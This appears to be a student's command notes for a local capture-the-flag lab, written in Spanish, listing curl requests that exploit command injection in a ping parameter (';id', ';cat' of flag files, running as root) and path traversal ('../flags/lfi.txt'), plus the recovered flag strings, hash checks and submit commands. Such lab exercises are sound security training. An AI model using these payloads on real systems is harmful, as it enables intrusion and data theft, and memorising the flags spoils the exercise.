@@ -1,0 +1,17 @@
+# Lab 07 — Parte B (Lautaro). Comandos (caja negra; no se leyo el codigo del target).
+# Target: server.py del lab en /app (= WORKDIR del Dockerfile). phantomcorp -> 127.0.0.1.
+
+# R3 — command injection (el host va a un shell: ping -c1 <host>)
+curl -s "http://phantomcorp/herramientas/ping?host=127.0.0.1;id"                       # uid=0(root)
+curl -s "http://phantomcorp/herramientas/ping?host=127.0.0.1;ls%20/app/flags"          # cmdi.txt, lfi.txt
+curl -s "http://phantomcorp/herramientas/ping?host=127.0.0.1;cat%20/app/flags/cmdi.txt" # R3
+
+# R4 — path traversal (los archivos se abren desde public/)
+curl -s "http://phantomcorp/descargar?archivo=../flags/lfi.txt"                         # R4 (un solo ../)
+
+# validacion de flags contra el manifest (no se lee solucion):
+printf '%s' 'FLAG{command_injection_rce}' | sha256sum   # == R3 del manifest
+printf '%s' 'FLAG{path_traversal_lfi}'    | sha256sum   # == R4 del manifest
+
+# envio (desde el host): ./ctf submit 07 R3 'FLAG{command_injection_rce}'
+#                        ./ctf submit 07 R4 'FLAG{path_traversal_lfi}'
